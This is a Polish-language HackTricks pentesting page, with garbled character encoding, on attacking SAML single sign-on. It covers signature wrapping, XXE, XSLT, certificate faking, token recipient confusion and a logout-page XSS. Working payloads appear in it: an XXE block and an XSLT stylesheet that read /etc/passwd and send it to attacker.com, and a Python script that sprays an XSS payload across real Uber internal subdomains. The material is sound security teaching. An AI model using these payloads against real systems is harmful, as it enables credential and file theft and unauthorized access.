# Ataki SAML

## Ataki SAML

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## NarzÄ™dzie

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): NarzÄ™dzie, ktÃ³re moÅ¼e przyjÄ…Ä‡ adres URL lub listÄ™ adresÃ³w URL i zwracaÄ‡ adres URL konsumujÄ…cy SAML.

## XML round-trip

W XML czÄ™Å›Ä‡ podpisana XML jest zapisywana w pamiÄ™ci, nastÄ™pnie wykonywane jest kodowanie/odkodowanie i sprawdzany jest podpis. Idealnie kodowanie/odkodowanie nie powinno zmieniaÄ‡ danych, ale w oparciu o ten scenariusz **sprawdzane dane i oryginalne dane mogÄ… siÄ™ rÃ³Å¼niÄ‡**.

Na przykÅ‚ad, sprawdÅº poniÅ¼szy kod:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Uruchomienie programu przeciwko REXML 3.2.4 lub wczeÅ›niejszej wersji spowoduje wygenerowanie nastÄ™pujÄ…cego wyniku:
```
First child in original doc: Y
First child after round-trip: Z
```
Tak REXML widziaÅ‚ oryginalny dokument XML z powyÅ¼szego programu:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (561).png>)

A tak widziaÅ‚ go po rundzie analizy i serializacji:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (562).png>)

Aby uzyskaÄ‡ wiÄ™cej informacji na temat podatnoÅ›ci i jak jej naduÅ¼ywaÄ‡:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## Ataki opakowujÄ…ce podpis XML

W atakach **opakowujÄ…cych podpis XML (XSW)** przeciwnicy wykorzystujÄ… podatnoÅ›Ä‡ wynikajÄ…cÄ… z przetwarzania dokumentÃ³w XML w dwÃ³ch rÃ³Å¼nych fazach: **walidacji podpisu** i **wywoÅ‚ania funkcji**. Ataki te polegajÄ… na zmianie struktury dokumentu XML. Konkretnie, atakujÄ…cy **wstrzykuje sfaÅ‚szowane elementy**, ktÃ³re nie kompromitujÄ… waÅ¼noÅ›ci podpisu XML. Manipulacja ta ma na celu stworzenie rozbieÅ¼noÅ›ci miÄ™dzy elementami analizowanymi przez **logikÄ™ aplikacji** a tymi sprawdzanymi przez **moduÅ‚ weryfikacji podpisu**. W rezultacie, podczas gdy podpis XML pozostaje technicznie waÅ¼ny i przechodzi weryfikacjÄ™, logika aplikacji przetwarza **faÅ‚szywe elementy**. W rezultacie atakujÄ…cy skutecznie omija **ochronÄ™ integralnoÅ›ci** i **uwierzytelnianie pochodzenia** podpisu XML, umoÅ¼liwiajÄ…c **wstrzykniÄ™cie dowolnej treÅ›ci** bez wykrycia.

NastÄ™pujÄ…ce ataki opierajÄ… siÄ™ na **[tym wpisie na blogu](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) i [tej pracy naukowej](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)**. SprawdÅº je dla dalszych szczegÃ³Å‚Ã³w.


### XSW #1
- **Strategia**: Dodanie nowego elementu nadrzÄ™dnego zawierajÄ…cego podpis.
- **Konsekwencje**: Walidator moÅ¼e siÄ™ pomyliÄ‡ miÄ™dzy prawidÅ‚owym "Response -> Assertion -> Subject" a "zÅ‚owrogim nowym Response -> Assertion -> Subject" atakujÄ…cego, co prowadzi do problemÃ³w z integralnoÅ›ciÄ… danych.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (538).png>)

### XSW #2
- **RÃ³Å¼nica w porÃ³wnaniu do XSW #1**: Wykorzystuje odÅ‚Ä…czony podpis zamiast opakowujÄ…cego podpis.
- **Konsekwencje**: "ZÅ‚owroga" struktura, podobna do XSW #1, ma na celu wprowadzenie w bÅ‚Ä…d logikÄ™ biznesowÄ… po sprawdzeniu integralnoÅ›ci.


![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (539).png>)

### XSW #3
- **Strategia**: Tworzenie zÅ‚owrogiego Assertion na tym samym poziomie hierarchicznym co oryginalne twierdzenie.
- **Konsekwencje**: Ma na celu wprowadzenie w bÅ‚Ä…d logikÄ™ biznesowÄ…, aby uÅ¼ywaÅ‚a zÅ‚oÅ›liwych danych.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (540).png>)

### XSW #4
- **RÃ³Å¼nica w porÃ³wnaniu do XSW #3**: Oryginalne twierdzenie staje siÄ™ dzieckiem zduplikowanego (zÅ‚owrogiego) twierdzenia.
- **Konsekwencje**: Podobnie jak XSW #3, ale bardziej agresywnie zmienia strukturÄ™ XML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (541).png>)

### XSW #5
- **Unikalny aspekt**: Ani Podpis, ani oryginalne Twierdzenie nie przestrzegajÄ… standardowych konfiguracji (opakowane/opakowujÄ…ce/odÅ‚Ä…czone).
- **Konsekwencje**: Skopiowane Twierdzenie otacza Podpis, modyfikujÄ…c oczekiwanÄ… strukturÄ™ dokumentu.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (542).png>)

### XSW #6
- **Strategia**: Podobne umieszczenie jak w XSW #4 i #5, ale z pewnym zaskoczeniem.
- **Konsekwencje**: Skopiowane Twierdzenie otacza Podpis, ktÃ³ry nastÄ™pnie otacza oryginalne Twierdzenie, tworzÄ…c zagnieÅ¼dÅ¼onÄ… strukturÄ™ wprowadzajÄ…cÄ… w bÅ‚Ä…d.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (543).png>)

### XSW #7
- **Strategia**: Wstawienie elementu Rozszerzenia z zÅ‚oÅ›liwym Twierdzeniem jako dzieckiem.
- **Konsekwencje**: Wykorzystuje mniej restrykcyjny schemat elementu Rozszerzenia w celu obejÅ›cia przeciwdziaÅ‚ajÄ…cych walidacji schematu, zwÅ‚aszcza w bibliotekach takich jak OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (544).png>)

### XSW #8
- **RÃ³Å¼nica w porÃ³wnaniu do XSW #7**: Wykorzystuje inny, mniej restrykcyjny element XML dla wariantu ataku.
- **Konsekwencje**: Oryginalne Twierdzenie staje siÄ™ dzieckiem mniej restrykcyjnego elementu, odwracajÄ…c strukturÄ™ uÅ¼ywanÄ… w XSW #7.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (545).png>)

### NarzÄ™dzie

MoÅ¼esz uÅ¼yÄ‡ rozszerzenia Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e), aby przeanalizowaÄ‡ Å¼Ä…danie, zastosowaÄ‡ wybrany atak XSW i go uruchomiÄ‡.

## XXE

JeÅ›li nie wiesz, jakie sÄ… ataki XXE, przeczytaj nastÄ™pujÄ…cÄ… stronÄ™:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

Odpowiedzi SAML sÄ… **skompresowanymi i zakodowanymi w formacie base64 dokumentami XML** i mogÄ… byÄ‡ podatne na ataki zewnÄ™trznych jednostek XML (XXE). Poprzez manipulacjÄ™ strukturÄ… XML odpowiedzi SAML, atakujÄ…cy mogÄ… prÃ³bowaÄ‡ wykorzystaÄ‡ podatnoÅ›ci XXE. Oto, jak taki atak moÅ¼e byÄ‡ zobrazowany:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## NarzÄ™dzia

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ rozszerzenia Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) do generowania POC z Å¼Ä…dania SAML w celu przetestowania moÅ¼liwych podatnoÅ›ci XXE i podatnoÅ›ci SAML.

SprawdÅº rÃ³wnieÅ¼ tÄ™ prezentacjÄ™: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT poprzez SAML

Aby uzyskaÄ‡ wiÄ™cej informacji na temat XSLT, przejdÅº do:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Rozszerzalny jÄ™zyk transformacji arkuszy stylÃ³w (XSLT) moÅ¼e byÄ‡ uÅ¼ywany do przeksztaÅ‚cania dokumentÃ³w XML na rÃ³Å¼ne formaty, takie jak HTML, JSON lub PDF. WaÅ¼ne jest zauwaÅ¼enie, Å¼e **transformacje XSLT sÄ… wykonywane przed weryfikacjÄ… cyfrowego podpisu**. Oznacza to, Å¼e atak moÅ¼e byÄ‡ udany nawet bez waÅ¼nego podpisu; wystarczajÄ…cy jest samopodpisany lub niewaÅ¼ny podpis.

Tutaj znajdziesz **POC** do sprawdzenia tego rodzaju podatnoÅ›ci, na stronie hacktricks, o ktÃ³rej mowa na poczÄ…tku tej sekcji, znajdziesz przykÅ‚adowe dane wejÅ›ciowe.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### NarzÄ™dzie

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ rozszerzenia Burp o nazwie [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e), aby wygenerowaÄ‡ POC z Å¼Ä…dania SAML w celu przetestowania moÅ¼liwych podatnoÅ›ci XSLT.

SprawdÅº rÃ³wnieÅ¼ tÄ™ prezentacjÄ™: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## Wykluczenie podpisu XML <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**Wykluczenie podpisu XML** obserwuje zachowanie implementacji SAML, gdy element podpisu nie jest obecny. JeÅ›li ten element jest brakujÄ…cy, **weryfikacja podpisu moÅ¼e nie wystÄ…piÄ‡**, co czyni go podatnym. MoÅ¼na to przetestowaÄ‡, zmieniajÄ…c zawartoÅ›Ä‡, ktÃ³ra zwykle jest weryfikowana przez podpis.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (547).png>)

### NarzÄ™dzie <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ rozszerzenia Burp o nazwie [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e). PrzechwyÄ‡ odpowiedÅº SAML i kliknij â€UsuÅ„ podpisyâ€. W ten sposÃ³b usuwane sÄ… **wszystkie** elementy podpisu.

Po usuniÄ™ciu podpisÃ³w, pozwÃ³l na przetworzenie Å¼Ä…dania do celu. JeÅ›li podpis nie jest wymagany przez usÅ‚ugÄ™

## FaÅ‚szowanie certyfikatu <a href="#certificate-faking" id="certificate-faking"></a>

FaÅ‚szowanie certyfikatu to technika testowania, czy **UsÅ‚ugodawca (SP) prawidÅ‚owo weryfikuje, czy wiadomoÅ›Ä‡ SAML jest podpisana** przez zaufanego dostawcÄ™ toÅ¼samoÅ›ci (IdP). Polega na uÅ¼yciu **samopodpisanego certyfikatu** do podpisania odpowiedzi SAML lub twierdzenia, co pomaga w ocenie procesu walidacji zaufania miÄ™dzy SP a IdP.

### Jak przeprowadziÄ‡ faÅ‚szowanie certyfikatu
PoniÅ¼sze kroki opisujÄ… proces za pomocÄ… rozszerzenia Burp o nazwie [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e):

1. PrzechwyÄ‡ odpowiedÅº SAML.
2. JeÅ›li odpowiedÅº zawiera podpis, wyÅ›lij certyfikat do SAML Raider Certs, korzystajÄ…c z przycisku â€WyÅ›lij certyfikat do SAML Raider Certsâ€.
3. W zakÅ‚adce SAML Raider Certificates wybierz zaimportowany certyfikat i kliknij â€Zapisz i podpisz samodzielnieâ€, aby utworzyÄ‡ samopodpisanÄ… kopiÄ™ oryginalnego certyfikatu.
4. WrÃ³Ä‡ do przechwyconego Å¼Ä…dania w Proxy Burp. Wybierz nowy samopodpisany certyfikat z listy rozwijanej XML Signature.
5. UsuÅ„ istniejÄ…ce podpisy za pomocÄ… przycisku â€UsuÅ„ podpisyâ€.
6. Podpisz wiadomoÅ›Ä‡ lub twierdzenie nowym certyfikatem, uÅ¼ywajÄ…c odpowiedniego przycisku **â€(Ponownie) Podpisz wiadomoÅ›Ä‡â€** lub **â€(Ponownie) Podpisz twierdzenieâ€**.
7. PrzeÅ›lij podpisanÄ… wiadomoÅ›Ä‡. PomyÅ›lne uwierzytelnienie oznacza, Å¼e SP akceptuje wiadomoÅ›ci podpisane przez twÃ³j samopodpisany certyfikat, ujawniajÄ…c potencjalne podatnoÅ›ci w procesie walidacji wiadomoÅ›ci SAML.


## Zamieszanie w odbiorcy tokena / Zamieszanie w docelowym dostawcy usÅ‚ug <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Zamieszanie w odbiorcy tokena (SAML-TRC) i zamieszanie w docelowym dostawcy usÅ‚ug dotyczÄ… sprawdzenia, czy **UsÅ‚ugodawca prawidÅ‚owo weryfikuje zamierzony odbiorcÄ™ odpowiedzi**. W zasadzie, UsÅ‚ugodawca powinien odrzuciÄ‡ odpowiedÅº uwierzytelniajÄ…cÄ…, jeÅ›li byÅ‚a przeznaczona dla innego dostawcy. Kluczowym elementem tutaj jest pole **Odbiorca**, znajdujÄ…ce siÄ™ w elemencie **SubjectConfirmationData** odpowiedzi SAML. To pole okreÅ›la adres URL wskazujÄ…cy, gdzie naleÅ¼y wysÅ‚aÄ‡ twierdzenie. JeÅ›li rzeczywisty odbiorca nie odpowiada zamierzonemu dostawcy usÅ‚ug, twierdzenie powinno zostaÄ‡ uznane za nieprawidÅ‚owe.

#### **Jak to dziaÅ‚a**

Aby atak SAML Token Recipient Confusion (SAML-TRC) byÅ‚ wykonalny, muszÄ… byÄ‡ speÅ‚nione pewne warunki. Po pierwsze, na UsÅ‚ugodawcy musi istnieÄ‡ prawidÅ‚owe konto (o nazwie SP-Legit). Po drugie, docelowy dostawca usÅ‚ug (SP-Target) musi akceptowaÄ‡ tokeny od tego samego dostawcy toÅ¼samoÅ›ci, ktÃ³ry obsÅ‚uguje SP-Legit.

Proces ataku jest prosty w tych warunkach. Rozpoczyna siÄ™ autentyczna sesja z SP-Legit za poÅ›rednictwem wspÃ³lnego dostawcy toÅ¼samoÅ›ci. Przechwycona odpowiedÅº SAML od dostawcy toÅ¼samoÅ›ci do SP-Legit jest nastÄ™pnie przekierowywana do SP-Target. Sukces w tym ataku mierzy siÄ™ poprzez akceptacjÄ™ twierdzenia przez SP-Target, co umoÅ¼liwia dostÄ™p do zasobÃ³w przy uÅ¼yciu tej samej nazwy konta, ktÃ³ra zostaÅ‚a uÅ¼yta dla SP-Legit.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS w funkcjonalnoÅ›ci wylogowywania

Oryginalne badania moÅ¼na znaleÅºÄ‡ pod [tym linkiem](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/).

Podczas procesu brutalnego przeszukiwania katalogÃ³w, odkryto stronÄ™ wylogowywania pod adresem:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Po wejÅ›ciu na ten link nastÄ…piÅ‚o przekierowanie na:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
To ujawniÅ‚o, Å¼e parametr `base` akceptuje adres URL. W zwiÄ…zku z tym, pojawiÅ‚ siÄ™ pomysÅ‚ podstawienia adresu URL na `javascript:alert(123);` w celu przeprowadzenia ataku XSS (Cross-Site Scripting).


### Masowa eksploatacja

[Z tej publikacji](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

Do analizy subdomen `uberinternal.com` w poszukiwaniu domen korzystajÄ…cych z tej samej biblioteki zostaÅ‚o uÅ¼yte narzÄ™dzie [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor). NastÄ™pnie zostaÅ‚ opracowany skrypt, ktÃ³ry celuje w stronÄ™ `oidauth/prompt`. Skrypt ten testuje podatnoÅ›Ä‡ na XSS (Cross-Site Scripting), wprowadzajÄ…c dane i sprawdzajÄ…c, czy sÄ… one odzwierciedlane w wyniku. W przypadku, gdy dane sÄ… odzwierciedlane, skrypt oznacza stronÄ™ jako podatnÄ….
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## OdwoÅ‚ania
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
